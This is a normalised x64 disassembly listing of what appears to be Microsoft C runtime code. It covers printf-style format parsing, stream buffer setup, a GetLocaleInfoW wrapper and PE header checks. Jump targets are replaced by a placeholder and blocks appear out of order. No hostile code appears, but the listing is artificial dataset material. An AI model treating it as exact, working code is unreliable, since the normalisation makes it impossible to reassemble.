lea rcx [ rbp - 0x40 ]
mov r8 rsi
mov rdx rbx
mov [ rsp + 0x20 ] r15d
call rax
mov edi r12d
and edi 0x80
je r-xdata
mov rdi [ r14 ]
add r14 0x8
mov [ rsp + 0x50 ] r14
call sub_140051528
xor r10d r10d
test eax eax
je r-xdata
mov ecx 0x6f
cmp eax ecx
je r-xdata
test r12b 0x40
je r-xdata
mov [ rsp + 0x50 ] r14
test r12b 0x40
je r-xdata
test eax r12d
jne r-xdata
test r8 r8
jns r-xdata
movzx eax [ r14 ]
add r14 0x8
mov [ rsp + 0x58 ] 0x1
mov [ rsp + 0x50 ] r14
mov [ rsp + 0x64 ] ax
test r11b r12b
je r-xdata
or r12d r11d
cmp eax 0x47
je r-xdata
lea eax [ rcx + 0x20 ]
cmp [ r8 ] ax
je r-xdata
xor eax eax
cmp [ rsp + 0x58 ] eax
jne r-xdata
test r12b 0x4
jne r-xdata
test r12b 0x2
je r-xdata
mov eax 0x2b
mov [ rsp + 0x60 ] ax
jmp r-xdata
mov eax 0x20
mov r15d edi
add edi 0x15d
movsxd rcx edi
call sub_140041684
mov [ rbp - 0x50 ] rax
test rax rax
je r-xdata
mov r15d [ rsp + 0x44 ]
jmp r-xdata
mov r15d 0x1
jmp r-xdata
mov ecx 0x67
cmp r13w cx
jne r-xdata
test r15d r15d
jne r-xdata
lea r11d [ r10 + 0x20 ]
test r11b r12b
je r-xdata
mov r9d 0x8
test r12b r12b
jns r-xdata
cmp eax 0x70
je r-xdata
mov r8d [ r14 - 0x8 ]
movsxd r8 [ r14 - 0x8 ]
jmp r-xdata
movzx r8d [ r14 - 0x8 ]
jmp r-xdata
movsx r8 [ r14 - 0x8 ]
jmp r-xdata
test edi edi
jns r-xdata
bt r12d 0xc
jb r-xdata
neg r8
bts r12d 0x8
mov [ rbp - 0x30 ] ax
mov [ rsp + 0x68 ] al
mov rax [ rbp - 0x70 ]
mov [ rsp + 0x69 ] r10b
movsxd r8 [ rax + 0x10c ]
lea r9 [ rbp - 0x70 ]
lea rdx [ rsp + 0x68 ]
lea rcx [ rbp - 0x30 ]
call sub_14004fb38
xor r10d r10d
test eax eax
jns r-xdata
cmp eax 0x53
je r-xdata
cmp [ r8 ] cx
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 r13
mov edx r15d
mov rcx rbx
mov [ rsp + 0x20 ] rsi
call sub_14004d014
xor r10d r10d
test r15d r15d
jle r-xdata
lea r9 [ rsp + 0x40 ]
mov ecx 0x30
mov r8 r13
mov edx r14d
call sub_14004cfc0
mov eax 0x20
mov [ rsp + 0x60 ] ax
lea edi [ rax - 0x1f ]
mov [ rsp + 0x48 ] edi
jmp r-xdata
mov edi 0x1
mov [ rsp + 0x48 ] edi
jmp r-xdata
mov [ rsp + 0x44 ] r15d
jmp r-xdata
mov rbx rax
mov esi edi
mov edi 0x2d
cmp [ rbx ] dil
jne r-xdata
test edi edi
jne r-xdata
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
lea rdx [ rbp - 0x70 ]
mov rcx rbx
call rax
mov [ rdi ] esi
mov [ rdi ] si
jmp r-xdata
mov r13d 0x200
mov r13d 0x200
or r12d r13d
jmp r-xdata
mov edi 0x10
bts r12d 0xf
cmp eax 0x73
je r-xdata
test r12b 0x40
je r-xdata
and r12d 0xfffffff7
cmp edi r13d
cmovg edi r13d
mov edi 0x1
jmp r-xdata
mov r8d r8d
lea rbx [ rbp - 0x30 ]
mov r15d 0x1
jmp r-xdata
mov [ rsp + 0x70 ] 0x1
jmp r-xdata
test r12d 0x830
jne r-xdata
cmp eax 0x58
je r-xdata
mov [ rsp + 0x6c ] r10d
mov r14 [ rsp + 0x50 ]
test r12b 0x4
je r-xdata
mov rdi rbx
mov esi r15d
mov r14d [ rsp + 0x5c ]
mov r13 [ rsp + 0x78 ]
sub r14d r15d
sub r14d edi
test r12b 0xc
jne r-xdata
mov rcx rbx
call sub_14003f7f0
mov esi [ rsp + 0x40 ]
xor r10d r10d
mov r15d eax
jmp r-xdata
bts r12d 0x8
inc rbx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
lea rdx [ rbp - 0x70 ]
mov rcx rbx
call rax
mov rax [ rbp - 0x50 ]
test rax rax
je r-xdata
mov [ rsp + 0x70 ] 0x1
jmp r-xdata
mov edx [ rsp + 0x48 ]
lea ecx [ r9 + 0x20 ]
add ax 0x51
lea edx [ rcx - 0x2e ]
mov [ rsp + 0x60 ] cx
mov [ rsp + 0x62 ] ax
jmp r-xdata
cmp [ rsp + 0x44 ] 0xffffffff
mov rbx [ r14 ]
mov eax 0x7fffffff
cmove edi eax
add r14 0x8
mov [ rsp + 0x50 ] r14
test r11b r12b
je r-xdata
mov ecx 0x75
cmp eax ecx
je r-xdata
xor edx edx
mov rax r8
movsxd rcx r9d
div rcx
mov r8 rax
lea eax [ rdx + 0x30 ]
cmp eax 0x39
jle r-xdata
test r8 r8
je r-xdata
mov esi [ rsp + 0x74 ]
mov rax r8
lea rbx [ rbp + 0x1cf ]
neg rax
sbb ecx ecx
and ecx edx
mov [ rsp + 0x48 ] ecx
or r12d r11d
mov eax 0x7
cmp eax 0x5a
je r-xdata
lea r9 [ rsp + 0x40 ]
mov ecx 0x20
mov r8 r13
mov edx r14d
call sub_14004cfc0
mov esi [ rsp + 0x40 ]
xor r10d r10d
mov r13 [ rsp + 0x78 ]
or esi 0xffffffff
mov [ rsp + 0x40 ] esi
jmp r-xdata
mov rdx [ rsp + 0x78 ]
movzx ecx [ rsp + 0x64 ]
lea r8 [ rsp + 0x40 ]
call sub_14004cf88
add rdi r13
xor r10d r10d
test esi esi
jg r-xdata
cmp [ rsp + 0x70 ] r10d
jne r-xdata
mov eax 0x8000
test eax r12d
je r-xdata
test rbx rbx
mov [ rsp + 0x58 ] 0x1
cmove rbx [ rw-data ]
mov rax rbx
jmp r-xdata
test rbx rbx
mov r15d r10d
cmove rbx [ rw-data ]
mov rsi rbx
test edi edi
jle r-xdata
mov r9d 0xa
mov ecx 0x78
cmp eax ecx
jne r-xdata
mov [ rbx ] al
dec rbx
jmp r-xdata
add eax esi
mov esi [ rsp + 0x40 ]
lea rax [ rbp + 0x1cf ]
mov [ rsp + 0x44 ] edi
sub eax ebx
inc rbx
mov r15d eax
test r13d r12d
je r-xdata
mov rax [ r14 ]
add r14 0x8
mov [ rsp + 0x50 ] r14
test rax rax
je r-xdata
cmp eax 0x61
je r-xdata
test esi esi
js r-xdata
mov rax [ rbp - 0x70 ]
lea r9 [ rbp - 0x70 ]
lea rcx [ rsp + 0x64 ]
movsxd r8 [ rax + 0x10c ]
mov rdx rdi
dec esi
call sub_14004fb38
xor r10d r10d
movsxd r13 eax
test eax eax
jle r-xdata
mov r13 [ rsp + 0x78 ]
jmp r-xdata
test edi edi
jne r-xdata
mov esi [ rsp + 0x40 ]
cmp [ rsi ] r10b
je r-xdata
lea eax [ rcx - 0x51 ]
jmp r-xdata
mov ecx edi
dec edi
test ecx ecx
jg r-xdata
test eax eax
mov eax 0x30
je r-xdata
mov rbx [ rw-data ]
mov rcx rbx
call sub_14003f7f0
xor r10d r10d
mov r15 rax
jmp r-xdata
mov rbx [ rax + 0x8 ]
test rbx rbx
je r-xdata
mov ecx 0x67
cmp eax 0x63
je r-xdata
mov esi [ rsp + 0x40 ]
dec edi
cmp [ rax ] r10w
je r-xdata
sub rax rbx
sar rax 0x1
mov r15d eax
jmp r-xdata
movzx ecx [ rsi ]
lea rdx [ rbp - 0x70 ]
call sub_14004fcb8
xor r10d r10d
test eax eax
je r-xdata
mov [ rsp + 0x74 ] eax
mov r9d 0x10
mov r13d 0x200
test r12b r12b
jns r-xdata
dec rbx
inc r15d
mov [ rbx ] al
jmp r-xdata
cmp [ rbx ] al
je r-xdata
mov edi 0x2d
bt r12d 0xb
jae r-xdata
jmp r-xdata
add rax 0x2
inc r15d
inc rsi
cmp r15d edi
jl r-xdata
inc rsi
movsx r15d [ rax ]
mov [ rsp + 0x58 ] r10d
jmp r-xdata
movsx eax [ rax ]
mov [ rsp + 0x58 ] 0x1
cdq
sub eax edx
sar eax 0x1
mov r15d eax
jmp r-xdata
sub_14004dba4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rdi
push r12
sub rsp 0x20
mov rbx rcx
call sub_14003be60
mov ecx eax
call sub_1400514c8
test eax eax
je r-xdata
xor eax eax
call sub_14003bc4c
add rax 0x30
cmp rbx rax
jne r-xdata
call sub_14003bc4c
add rax 0x60
cmp rbx rax
jne r-xdata
xor eax eax
jmp r-xdata
mov eax 0x1
inc [ rw-data ]
test [ rbx + 0x18 ] 0x10c
jne r-xdata
lea r12 [ rw-data ]
movsxd rdi eax
cmp [ r12 + rdi * 8 ] 0x0
jne r-xdata
mov rcx [ r12 + rdi * 8 ]
mov [ rbx + 0x24 ] 0x1000
mov [ rbx + 0x8 ] 0x1000
mov [ rbx + 0x10 ] rcx
mov [ rbx ] rcx
mov ecx 0x1000
call sub_140041684
mov [ r12 + rdi * 8 ] rax
test rax rax
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rdi [ rsp + 0x38 ]
add rsp 0x20
pop r12
retn
lea rax [ rbx + 0x20 ]
mov [ rbx + 0x10 ] rax
mov [ rbx ] rax
mov eax 0x2
mov [ rbx + 0x24 ] eax
mov [ rbx + 0x8 ] eax
jmp r-xdata
or [ rbx + 0x18 ] 0x1102
mov eax 0x1
jmp r-xdata
sub_14004dc78
test ecx ecx
je r-xdata
retn
push rbx
sub rsp 0x20
test [ rdx + 0x18 ] 0x1000
mov rbx rdx
je r-xdata
add rsp 0x20
pop rbx
mov rcx rdx
call sub_14003ed0c
and [ rbx + 0x18 ] 0xffffeeff
and [ rbx + 0x24 ] 0x0
and [ rbx ] 0x0
and [ rbx + 0x10 ] 0x0
sub_14004dcb0
push rbx
sub rsp 0x20
test [ rdx + 0x18 ] 0x40
mov rbx r8
je r-xdata
dec [ rdx + 0x8 ]
js r-xdata
cmp [ rdx + 0x10 ] 0x0
jne r-xdata
movsx ecx cl
call sub_140044da8
mov rax [ rdx ]
mov [ rax ] cl
inc [ rdx ]
movzx eax cl
jmp r-xdata
inc [ r8 ]
jmp r-xdata
inc [ rbx ]
or [ rbx ] eax
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
add rsp 0x20
pop rbx
retn
sub_14004dcf8
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x1d0 ]
sub rsp 0x2d0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x1c8 ] rax
xor eax eax
mov rbx rcx
mov [ rsp + 0x70 ] rcx
mov [ rsp + 0x68 ] rdx
lea rcx [ rbp - 0x80 ]
mov rdx r8
mov r15 r9
mov [ rsp + 0x64 ] eax
mov r13d eax
mov [ rsp + 0x58 ] eax
mov edi eax
mov [ rsp + 0x44 ] eax
mov [ rsp + 0x4c ] eax
mov [ rsp + 0x5c ] eax
mov [ rsp + 0x54 ] eax
call sub_14003b928
call sub_14003f1a4
xor r10d r10d
mov [ rbp - 0x60 ] rax
test rbx rbx
jne r-xdata
or r14d 0xffffffff
test [ rbx + 0x18 ] 0x40
lea r9 [ __dos_header ]
jne r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
xor r11d r11d
cmp [ rbp - 0x68 ] r11b
je r-xdata
mov rdx [ rsp + 0x68 ]
test rdx rdx
je r-xdata
mov rcx rbx
call sub_14003be60
lea rdx [ rw-data ]
cmp eax r14d
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov rax [ rbp - 0x70 ]
and [ rax + 0xc8 ] 0xfffffffd
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
xor r11d r11d
cmp [ rbp - 0x68 ] r11b
mov r12b [ rdx ]
mov esi r10d
mov [ rsp + 0x40 ] r10d
mov [ rsp + 0x48 ] r10d
mov r8d r10d
mov [ rbp - 0x50 ] r10
test r12b r12b
je r-xdata
mov r8 rdx
lea r9 [ __dos_header ]
cmp eax 0xfffffffe
je r-xdata
mov rcx [ rbp + 0x1c8 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x320 ]
add rsp 0x2d0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax r14d
jmp r-xdata
mov rax [ rbp - 0x70 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x68 ] r10b
je r-xdata
mov rbx [ rbp - 0x48 ]
mov r11d 0x200
cmp eax r14d
je r-xdata
movsxd r8 eax
lea r9 [ __dos_header ]
mov rcx r8
and r8d 0x1f
sar rcx 0x5
imul r8 r8 0x58
add r8 [ r9 + rcx * 8 + 0x96dc0 ]
jmp r-xdata
mov eax esi
mov rcx [ rbp - 0x70 ]
and [ rcx + 0xc8 ] 0xfffffffd
test r8d r8d
je r-xdata
lea eax [ r12 - 0x20 ]
cmp al 0x58
ja r-xdata
test [ rdx + 0x38 ] 0x80
je r-xdata
cmp eax 0xfffffffe
je r-xdata
test [ r8 + 0x38 ] 0x7f
jne r-xdata
cmp r8d 0x7
jne r-xdata
mov ecx r10d
movsx rax r12b
movzx ecx [ rax + r9 + 0x6c6c0 ]
and ecx 0xf
jmp r-xdata
xor r10d r10d
movsxd rdx eax
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
add rdx [ r9 + rax * 8 + 0x96dc0 ]
mov ecx r8d
test r8d r8d
je r-xdata
movsxd rax ecx
lea rcx [ rax + rax * 8 ]
movsxd rax r8d
add rcx rax
movzx r8d [ rcx + r9 + 0x6c6e0 ]
shr r8d 0x4
mov [ rsp + 0x60 ] r8d
cmp r8d 0x8
je r-xdata
lea rdx [ rbp - 0x80 ]
movzx ecx r12b
mov [ rsp + 0x54 ] r10d
call sub_14004fcb8
xor esi esi
test eax eax
je r-xdata
dec ecx
je r-xdata
mov rdx [ rsp + 0x70 ]
lea r8 [ rsp + 0x40 ]
mov cl r12b
call sub_14004dcb0
mov esi [ rsp + 0x40 ]
xor r10d r10d
jmp r-xdata
mov rdx [ rsp + 0x70 ]
lea r8 [ rsp + 0x40 ]
mov cl r12b
call sub_14004dcb0
mov rdx [ rsp + 0x68 ]
mov r12b [ rdx ]
inc rdx
mov [ rsp + 0x68 ] rdx
test r12b r12b
je r-xdata
mov [ rsp + 0x78 ] r10d
mov [ rsp + 0x5c ] r10d
mov [ rsp + 0x58 ] r10d
mov [ rsp + 0x4c ] r10d
mov r13d r10d
mov edi r14d
mov [ rsp + 0x44 ] r14d
mov [ rsp + 0x54 ] r10d
jmp r-xdata
dec ecx
je r-xdata
mov rdx [ rsp + 0x68 ]
mov r8d [ rsp + 0x60 ]
mov r11d 0x200
lea r9 [ __dos_header ]
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
cmp [ rbp - 0x68 ] sil
jmp r-xdata
mov r12b [ rdx ]
test r12b r12b
jne r-xdata
cmp r12b 0x20
je r-xdata
dec ecx
je r-xdata
inc rdx
mov [ rsp + 0x68 ] rdx
test esi esi
js r-xdata
je r-xdata
or r13d 0x2
jmp r-xdata
cmp r12b 0x23
je r-xdata
cmp r12b 0x2a
jne r-xdata
dec ecx
je r-xdata
bts r13d 0x7
jmp r-xdata
cmp r12b 0x2b
je r-xdata
mov eax [ rsp + 0x58 ]
lea ecx [ rax + rax * 4 ]
movsx eax r12b
lea eax [ rax + rcx * 2 - 0x30 ]
mov eax [ r15 ]
add r15 0x8
mov [ rsp + 0x58 ] eax
test eax eax
jns r-xdata
mov edi r10d
mov [ rsp + 0x44 ] r10d
jmp r-xdata
dec ecx
je r-xdata
or r13d 0x1
jmp r-xdata
cmp r12b 0x2d
je r-xdata
or r13d 0x4
neg eax
jmp r-xdata
cmp r12b 0x2a
jne r-xdata
dec ecx
je r-xdata
or r13d 0x4
jmp r-xdata
cmp r12b 0x30
jne r-xdata
mov [ rsp + 0x58 ] eax
jmp r-xdata
lea ecx [ rdi + rdi * 4 ]
movsx eax r12b
lea edi [ rax + rcx * 2 - 0x30 ]
mov [ rsp + 0x44 ] edi
jmp r-xdata
mov edi [ r15 ]
add r15 0x8
mov [ rsp + 0x44 ] edi
test edi edi
jns r-xdata
cmp r12b 0x49
je r-xdata
dec ecx
jne r-xdata
or r13d 0x8
jmp r-xdata
mov edi r14d
mov [ rsp + 0x44 ] r14d
jmp r-xdata
mov al [ rdx ]
bts r13d 0xf
cmp al 0x36
jne r-xdata
cmp r12b 0x68
je r-xdata
movsx eax r12b
cmp eax 0x64
jg r-xdata
cmp al 0x33
jne r-xdata
cmp [ rdx + 0x1 ] 0x34
jne r-xdata
or r13d 0x20
jmp r-xdata
cmp r12b 0x6c
je r-xdata
cmp eax 0x65
jl r-xdata
je r-xdata
cmp al 0x64
je r-xdata
cmp [ rdx + 0x1 ] 0x32
jne r-xdata
add rdx 0x2
bts r13d 0xf
jmp r-xdata
cmp [ rdx ] 0x6c
jne r-xdata
cmp r12b 0x77
jne r-xdata
cmp [ rsp + 0x5c ] r10d
jne r-xdata
cmp eax 0x67
jle r-xdata
or r13d 0x40
cmp eax 0x41
je r-xdata
cmp al 0x69
je r-xdata
add rdx 0x2
btr r13d 0xf
jmp r-xdata
or r13d 0x10
jmp r-xdata
inc rdx
bts r13d 0xc
jmp r-xdata
bts r13d 0xb
jmp r-xdata
mov rax [ rbp - 0x50 ]
test rax rax
je r-xdata
test r13b 0x40
je r-xdata
or r13d 0x40
lea rbx [ rbp - 0x40 ]
mov esi r11d
test edi edi
jns r-xdata
cmp eax 0x69
je r-xdata
mov r8 [ r15 ]
add r15 0x8
jmp r-xdata
bt r13d 0xc
jae r-xdata
mov [ rsp + 0x78 ] 0x1
add r12b 0x20
cmp eax 0x43
je r-xdata
cmp al 0x6f
je r-xdata
mov edi [ rsp + 0x44 ]
mov rcx rax
call sub_14003ad04
xor r10d r10d
mov [ rbp - 0x50 ] r10
mov edi [ rsp + 0x4c ]
bt r13d 0x8
jae r-xdata
jne r-xdata
mov [ rsp + 0x44 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
test r13b 0x40
je r-xdata
add r15 0x8
test r13b 0x20
je r-xdata
test r13d 0x830
jne r-xdata
cmp eax 0x45
je r-xdata
cmp al 0x75
je r-xdata
mov rax [ rbp - 0x60 ]
lea r9 [ rsp + 0x40 ]
lea rcx [ rsp + 0x50 ]
mov r8 rsi
mov edx edi
mov [ rsp + 0x20 ] rax
call sub_140044f8c
test r13b 0x8
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx r12d
mov cl 0x20
call sub_140044f38
test r13b 0x1
je r-xdata
mov [ rsp + 0x50 ] 0x2d
jmp r-xdata
cmp edi r11d
cmovg edi r11d
mov [ rsp + 0x44 ] edi
cmp edi 0xa3
jle r-xdata
cmp r12b 0x67
jne r-xdata
mov rax [ r15 ]
mov rcx [ rw-data ]
add r15 0x8
movsx edi r12b
movsxd rsi esi
mov [ rbp - 0x48 ] rax
call [ DecodePointer@IAT ]
lea rcx [ rbp - 0x80 ]
mov r9d edi
mov [ rsp + 0x30 ] rcx
mov ecx [ rsp + 0x78 ]
mov r8 rsi
mov [ rsp + 0x28 ] ecx
mov ecx [ rsp + 0x44 ]
mov rdx rbx
mov [ rsp + 0x20 ] ecx
lea rcx [ rbp - 0x48 ]
call rax
mov edi r13d
and edi 0x80
je r-xdata
mov rdi [ r15 ]
add r15 0x8
call sub_140051528
xor r10d r10d
test eax eax
je r-xdata
cmp eax 0x6f
je r-xdata
test eax r13d
jne r-xdata
test r8 r8
jns r-xdata
test r13b 0x40
je r-xdata
test r13b 0x40
je r-xdata
add r15 0x8
test r13d 0x810
je r-xdata
bts r13d 0xb
cmp eax 0x47
je r-xdata
cmp al 0x78
je r-xdata
mov edi [ rsp + 0x48 ]
xor eax eax
cmp [ rsp + 0x54 ] eax
je r-xdata
test r13b 0x4
jne r-xdata
test r13b 0x2
je r-xdata
mov [ rsp + 0x50 ] 0x2b
mov edi 0x1
mov [ rsp + 0x4c ] edi
jmp r-xdata
add edi 0x15d
movsxd rcx edi
call sub_140041684
mov [ rbp - 0x50 ] rax
test rax rax
je r-xdata
mov [ rsp + 0x44 ] 0x1
jmp r-xdata
cmp r12b 0x67
jne r-xdata
xor eax eax
cmp [ rsp + 0x44 ] eax
jne r-xdata
test r13b 0x20
je r-xdata
mov r9d 0x8
test r13b r13b
jns r-xdata
cmp eax 0x70
je r-xdata
test edi edi
jns r-xdata
bt r13d 0xc
jb r-xdata
neg r8
bts r13d 0x8
mov r8d [ r15 - 0x8 ]
movsxd r8 [ r15 - 0x8 ]
jmp r-xdata
movzx r8d [ r15 - 0x8 ]
jmp r-xdata
movsx r8 [ r15 - 0x8 ]
jmp r-xdata
mov al [ r15 - 0x8 ]
mov [ rsp + 0x48 ] 0x1
mov [ rbp - 0x40 ] al
movzx r9d [ r15 - 0x8 ]
lea rdx [ rbp - 0x40 ]
lea rcx [ rsp + 0x48 ]
mov r8 r11
call sub_14005009c
xor r10d r10d
test eax eax
je r-xdata
cmp eax 0x53
je r-xdata
cmp al 0x58
je r-xdata
mov rax [ rbp - 0x60 ]
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx edi
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_140044f8c
xor r10d r10d
test edi edi
jle r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx r12d
mov cl 0x30
call sub_140044f38
mov [ rsp + 0x50 ] 0x20
jmp r-xdata
mov r12d [ rsp + 0x58 ]
mov rsi [ rsp + 0x70 ]
sub r12d [ rsp + 0x48 ]
sub r12d edi
test r13b 0xc
jne r-xdata
mov [ rsp + 0x44 ] 0xa3
mov rbx rax
mov esi edi
jmp r-xdata
cmp [ rbx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
lea rdx [ rbp - 0x80 ]
mov rcx rbx
call rax
mov [ rdi ] esi
mov [ rdi ] si
jmp r-xdata
mov edx [ rsp + 0x4c ]
or r13d r11d
jmp r-xdata
mov edi 0x10
bts r13d 0xf
cmp eax 0x73
je r-xdata
and r13d 0xfffffff7
cmp edi r11d
cmovg edi r11d
mov edi 0x1
jmp r-xdata
mov r8d r8d
lea rbx [ rbp - 0x40 ]
jmp r-xdata
mov [ rsp + 0x5c ] 0x1
jmp r-xdata
test r13d 0x830
jne r-xdata
cmp eax 0x58
je r-xdata
mov [ rsp + 0x60 ] r10d
test r13b 0x4
je r-xdata
mov rsi rbx
mov rcx rbx
call sub_14003f7f0
mov esi [ rsp + 0x40 ]
bts r13d 0x8
inc rbx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
lea rdx [ rbp - 0x80 ]
mov rcx rbx
call rax
mov [ rsp + 0x5c ] 0x1
jmp r-xdata
add al 0x51
mov [ rsp + 0x50 ] 0x30
lea edx [ r9 - 0xe ]
mov [ rsp + 0x51 ] al
jmp r-xdata
mov rbx [ r15 ]
cmp edi r14d
mov eax edi
mov ecx 0x7fffffff
cmove eax ecx
add r15 0x8
test r13d 0x810
je r-xdata
cmp eax 0x75
je r-xdata
xor edx edx
mov rax r8
movsxd rcx r9d
div rcx
mov r8 rax
lea eax [ rdx + 0x30 ]
cmp eax 0x39
jle r-xdata
test r8 r8
je r-xdata
mov esi [ rsp + 0x64 ]
mov rax r8
lea rbx [ rbp + 0x1bf ]
neg rax
sbb ecx ecx
and ecx edx
mov [ rsp + 0x4c ] ecx
bts r13d 0xb
mov eax 0x7
cmp eax 0x5a
je r-xdata
mov r8 [ rsp + 0x70 ]
lea r9 [ rsp + 0x40 ]
mov edx r12d
mov cl 0x20
call sub_140044f38
mov esi [ rsp + 0x40 ]
xor r10d r10d
mov esi r14d
mov [ rsp + 0x40 ] r14d
jmp r-xdata
mov edx [ rbp - 0x58 ]
test edx edx
je r-xdata
mov eax 0x8000
test eax r13d
jne r-xdata
test rbx rbx
cmove rbx [ rw-data ]
mov rcx rbx
jmp r-xdata
test rbx rbx
mov [ rsp + 0x54 ] 0x1
cmove rbx [ rw-data ]
mov rcx rbx
jmp r-xdata
mov r9d 0xa
cmp eax 0x78
jne r-xdata
mov [ rbx ] al
dec rbx
jmp r-xdata
add eax esi
mov esi [ rsp + 0x40 ]
lea rax [ rbp + 0x1bf ]
mov [ rsp + 0x44 ] edi
sub eax ebx
inc rbx
mov [ rsp + 0x48 ] eax
test r11d r13d
je r-xdata
mov rax [ r15 ]
add r15 0x8
test rax rax
je r-xdata
cmp eax 0x61
je r-xdata
test esi esi
js r-xdata
mov rax [ rbp - 0x60 ]
mov r8 [ rsp + 0x70 ]
lea r9 [ rsp + 0x40 ]
lea rcx [ rbp + 0x1c0 ]
mov [ rsp + 0x20 ] rax
call sub_140044f8c
xor r10d r10d
test edi edi
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax 0x27
jmp r-xdata
mov ecx edi
dec edi
test ecx ecx
jg r-xdata
test eax eax
je r-xdata
mov rbx [ rw-data ]
mov rcx rbx
call sub_14003f7f0
jmp r-xdata
mov rbx [ rax + 0x8 ]
test rbx rbx
je r-xdata
cmp eax 0x63
je r-xdata
movzx r9d [ rsi ]
lea rdx [ rbp + 0x1c0 ]
lea rcx [ rbp - 0x58 ]
mov r8d 0x6
dec edi
add rsi 0x2
call sub_14005009c
xor r10d r10d
test eax eax
jne r-xdata
jmp r-xdata
dec eax
cmp [ rcx ] r10b
je r-xdata
sub ecx ebx
dec eax
cmp [ rcx ] r10w
je r-xdata
sub rcx rbx
sar rcx 0x1
jmp r-xdata
mov [ rsp + 0x64 ] eax
mov r9d 0x10
test r13b r13b
jns r-xdata
dec rbx
inc [ rsp + 0x48 ]
mov [ rbx ] 0x30
jmp r-xdata
cmp [ rbx ] 0x30
je r-xdata
xor r10d r10d
movsx eax [ rax ]
bt r13d 0xb
jae r-xdata
jmp r-xdata
mov esi [ rsp + 0x40 ]
inc rcx
add rcx 0x2
mov [ rsp + 0x48 ] ecx
jmp r-xdata
mov [ rsp + 0x54 ] r10d
jmp r-xdata
cdq
mov [ rsp + 0x54 ] 0x1
sub eax edx
sar eax 0x1
jmp r-xdata
mov [ rsp + 0x48 ] eax
sub_14004e83c
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0xd0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xc0 ] rax
mov rbx [ rsp + 0x130 ]
mov esi r9d
mov r12d r8d
mov r14 rcx
cmp edx 0x1
jne r-xdata
mov ebp 0x2
cmp edx ebp
jne r-xdata
lea r9 [ rsp + 0x40 ]
mov r8d esi
mov edx r12d
lea rdi [ rsp + 0x40 ]
xor ebp ebp
mov [ rsp + 0x20 ] 0x80
call sub_1400528f8
mov r13d eax
test eax eax
jne r-xdata
test edx edx
jne r-xdata
and [ rbx ] 0x0
xor r9d r9d
xor r8d r8d
mov edx esi
mov ecx r12d
call [ GetLocaleInfoW@IAT ]
movsxd rdi eax
test eax eax
je r-xdata
movsxd rsi r13d
mov edx 0x1
mov rcx rsi
call sub_140041704
mov rcx rax
mov [ rbx ] rax
test rax rax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
or eax 0xffffffff
and [ rsp + 0x30 ] edx
bts esi 0x1d
lea r8 [ rsp + 0x30 ]
mov edx esi
mov r9d ebp
mov ecx r12d
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
mov rcx [ rbx ]
call sub_14003ad04
and [ rbx ] 0x0
jmp r-xdata
mov rcx rdi
mov edx ebp
call sub_140041704
mov [ rbx ] rax
test rax rax
je r-xdata
lea eax [ r13 - 0x1 ]
mov r8 rdi
mov rdx rsi
movsxd r9 eax
call sub_140048a40
test eax eax
jne r-xdata
test ebp ebp
je r-xdata
and [ rsp + 0x20 ] ebp
xor r9d r9d
mov r8d esi
mov edx r12d
mov rcx r14
call sub_1400528f8
movsxd r13 eax
test eax eax
je r-xdata
mov al [ rsp + 0x30 ]
mov [ rbx ] al
jmp r-xdata
mov r9d edi
mov r8 rax
mov edx esi
mov ecx r12d
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_1400436bc
int3
test ebp ebp
je r-xdata
mov rcx rdi
call sub_14003ad04
lea edx [ rbp + 0x1 ]
mov rcx r13
call sub_140041704
mov rdi rax
test rax rax
je r-xdata
xor eax eax
jmp r-xdata
mov rcx rdi
call sub_14003ad04
mov r9 rax
mov r8d esi
mov edx r12d
mov rcx r14
mov ebp 0x1
mov [ rsp + 0x20 ] r13d
call sub_1400528f8
mov r13d eax
test eax eax
je r-xdata
mov rcx [ rsp + 0xc0 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0xd0
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_14004ea20
mov rax rcx
mov ecx 0x5a4d
cmp [ rax ] cx
je r-xdata
movsxd rcx [ rax + 0x3c ]
add rcx rax
xor eax eax
cmp [ rcx ] 0x4550
jne r-xdata
xor eax eax
retn
retn
mov edx 0x20b
cmp [ rcx + 0x18 ] dx
sete al
sub_14004ea50
movsxd r8 [ rcx + 0x3c ]
xor r9d r9d
mov r10 rdx
add r8 rcx
movzx eax [ r8 + 0x14 ]
movzx r11d [ r8 + 0x6 ]
lea rcx [ rax + r8 + 0x18 ]
test r11d r11d
je r-xdata
xor eax eax
retn
mov edx [ rcx + 0xc ]
cmp r10 rdx
jb r-xdata
inc r9d
add rcx 0x28
cmp r9d r11d
jb r-xdata
mov eax [ rcx + 0x8 ]
